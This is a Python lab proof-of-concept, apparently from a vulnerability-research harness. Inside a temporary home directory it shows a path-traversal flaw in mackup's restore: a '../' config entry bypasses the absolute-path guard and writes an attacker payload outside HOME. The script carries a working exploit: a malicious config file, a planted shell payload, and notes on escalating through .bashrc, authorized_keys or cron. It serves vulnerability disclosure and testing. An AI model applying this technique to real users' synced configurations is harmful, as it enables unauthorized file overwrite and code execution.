"""Local-lab PoC: mackup config-name path traversal (CWE-22).

Drives the REAL mackup code (config parser + ApplicationProfile copy engine)
inside a throwaway $HOME and proves that a `[configuration_files]` entry
containing `../` — which passes mackup's absolute-path guard — escapes HOME on
restore, yielding an arbitrary file write outside the intended root.

Threat model: mackup's storage/app-config lives in a *synced/shared* folder
(Dropbox, Google Drive, git). An attacker who influences a custom app config or
the synced storage plants a traversal entry; on the victim's `mackup restore`
the write lands anywhere the victim (often via sudo) can write → overwrite
`~/.bashrc` / `authorized_keys` / cron → code execution.

Oracle (non-DoS, integrity impact): a file materializes OUTSIDE realpath(HOME).

Run:
    LOTUS_TARGET=data/e2e_targets/mackup .venv/bin/python -m backend.harness.mackup_path_traversal_poc
"""
from __future__ import annotations

import configparser
import json
import os
import sys
import tempfile
from pathlib import Path


def _load_mackup_module(target: Path):
    src = target / "src"
    if not (src / "mackup").is_dir():
        raise SystemExit(f"mackup source not found under {src}")
    sys.path.insert(0, str(src))
    import mackup.application as application  # noqa: E402
    import mackup.mackup as mackup_mod  # noqa: E402
    import mackup.utils as utils  # noqa: E402
    return application, mackup_mod, utils


def _prove_guard_gap(evil_cfg: Path) -> dict:
    """Replicate appsdb's exact guard to show `/abs` is blocked but `../` is not."""
    cfg = configparser.ConfigParser(allow_no_value=True)
    cfg.optionxform = str  # type: ignore
    cfg.read(evil_cfg)
    accepted, abs_blocked = [], []
    for path in cfg.options("configuration_files"):
        if path.startswith("/"):          # <-- mackup's only guard (appsdb.py:48)
            abs_blocked.append(path)
        else:
            accepted.append(path)          # `../../x` reaches here
    return {"accepted": accepted, "absolute_blocked": abs_blocked}


def run() -> dict:
    target = Path(os.environ.get("LOTUS_TARGET", "data/e2e_targets/mackup")).resolve()
    application, mackup_mod, utils = _load_mackup_module(target)

    root = Path(tempfile.mkdtemp(prefix="mackup_lab_"))
    home = root / "home"
    storage = home / "Storage"            # mackup_folder, lives under HOME (realistic)
    outside = root / "outside_home"       # sibling of HOME => outside HOME
    (home / ".mackup").mkdir(parents=True)
    (home / ".config").mkdir(parents=True)
    storage.mkdir(parents=True)
    outside.mkdir(parents=True)

    # Isolate env so we touch nothing real.
    os.environ["HOME"] = str(home)
    os.environ["XDG_CONFIG_HOME"] = str(home / ".config")

    # Attacker-controlled name: single-'..' relative path -> passes '/' guard.
    victim_target = outside / "pwned"
    name = os.path.relpath(victim_target, home)          # e.g. '../outside_home/pwned'
    assert not name.startswith("/"), "guard would block absolute; keep it relative"

    # Malicious custom app config the victim syncs/imports.
    evil_cfg = home / ".mackup" / "evil.cfg"
    evil_cfg.write_text(
        "[application]\n"
        "name = Evil\n\n"
        "[configuration_files]\n"
        f"{name}\n"
        "/etc/shadow\n",                                 # absolute decoy (should be blocked)
        encoding="utf-8",
    )
    guard = _prove_guard_gap(evil_cfg)

    # Plant attacker payload at the storage-relative source location.
    src_in_storage = Path(os.path.join(str(storage), name))
    src_in_storage.parent.mkdir(parents=True, exist_ok=True)
    payload = "#!/bin/sh\ntouch /tmp/mackup_rce_marker  # attacker code\n"
    src_in_storage.write_text(payload, encoding="utf-8")

    # Minimal .mackup.cfg so Mackup() resolves mackup_folder to our storage dir.
    (home / ".mackup.cfg").write_text(
        "[storage]\nengine = file_system\n"
        f"path = {home}\ndirectory = Storage\n",
        encoding="utf-8",
    )

    utils.FORCE_YES = True  # non-interactive: accept overwrite prompts

    mackup = mackup_mod.Mackup()
    profile = application.ApplicationProfile(
        mackup=mackup, files={name}, dry_run=False, verbose=True,
    )

    # Drive the REAL restore path: utils.copy(mackup_filepath, home_filepath)
    home_filepath, mackup_filepath = profile.get_filepaths(name)
    profile.copy_files_from_mackup_folder()

    dst_real = os.path.realpath(home_filepath)
    home_real = os.path.realpath(str(home))
    escaped = not (dst_real == home_real or dst_real.startswith(home_real + os.sep))
    written = os.path.isfile(dst_real)
    content_ok = written and Path(dst_real).read_text(encoding="utf-8") == payload

    proven = bool(escaped and written and content_ok)
    evidence = {
        "path": f"config_name={name}",
        "command": "mackup restore (ApplicationProfile.copy_files_from_mackup_folder)",
        "snippet": (
            f"wrote {len(payload)} bytes to {dst_real} (realpath OUTSIDE HOME={home_real}); "
            f"content matches attacker payload"
        ),
        "anomaly_type": "arbitrary_write",
        "home_filepath": home_filepath,
        "resolved_dst": dst_real,
        "escaped_home": escaped,
        "guard_gap": guard,
    }

    finding = {
        "tool": "lab-dynamic-poc",  # dynamic prover, NOT the static path-containment detector
        "detector": "path-containment",  # the static lead that flagged it
        "title": "mackup: config-name path traversal → arbitrary file write outside HOME (CWE-22)",
        "description": (
            "A mackup custom app config `[configuration_files]` entry containing `../` "
            "bypasses the absolute-path guard (appsdb.py rejects only paths starting with "
            "'/'), flows through ApplicationProfile.get_filepaths() "
            "(os.path.join(HOME, name)) into utils.copy on restore, and writes attacker "
            "content to an arbitrary location outside HOME. Escalates to code execution "
            "via ~/.bashrc / authorized_keys / cron."
        ),
        "file": "src/mackup/appsdb.py",
        "line": 48,
        "cvss": 8.6,
        "qualification": "QUALIFIED",
        "discovery_technique": "path-traversal-partial-sanitization",
        "poc": {
            "command": "mackup restore with malicious ~/.mackup/evil.cfg",
            "payload": f"[configuration_files]\\n{name}",
        },
        "poc_result": "triggered" if proven else "failed",
        "lab_evidence": {"poc_passed": proven, "probes": [evidence]},
    }
    return {"proven": proven, "evidence": evidence, "finding": finding, "lab_root": str(root)}


def _gate(finding_json: str) -> int:
    """Host-side (any Python): run a container-produced finding through proof gates."""
    from backend.proof_gates import finalize_finding_status, has_lab_proof
    f = json.loads(Path(finding_json).read_text())
    summary = finalize_finding_status(f, cvss_threshold=7.0)
    print("-" * 72)
    print(f"has_lab_proof    : {has_lab_proof(f)}")
    print(f"gates            : {json.dumps(f['gates'])}")
    print(f"status           : {summary['status']}  report_eligible={summary['report_eligible']}  "
          f"confirmed={summary['confirmed']}")
    ok = summary["confirmed"] and summary["report_eligible"]
    print("=" * 72)
    print("RESULT:", "CONFIRMED + REPORT-ELIGIBLE" if ok else "NOT CONFIRMED")
    return 0 if ok else 1


def main() -> int:
    # Host gate-only mode (no mackup execution; runs under any Python).
    if "--gate" in sys.argv:
        return _gate(sys.argv[sys.argv.index("--gate") + 1])

    result = run()
    print("=" * 72)
    print("MACKUP PATH-TRAVERSAL LAB PoC")
    print("=" * 72)
    ev = result["evidence"]
    print(f"guard gap        : absolute_blocked={ev['guard_gap']['absolute_blocked']} "
          f"accepted={ev['guard_gap']['accepted']}")
    print(f"home_filepath    : {ev['home_filepath']}")
    print(f"resolved dst     : {ev['resolved_dst']}")
    print(f"escaped HOME     : {ev['escaped_home']}")
    print(f"PROVEN IN LAB    : {result['proven']}")

    out = os.environ.get("LOTUS_POC_OUT")
    if out:
        Path(out).write_text(json.dumps(result["finding"], indent=2))
        print(f"finding written  : {out}")
    return 0 if result["proven"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
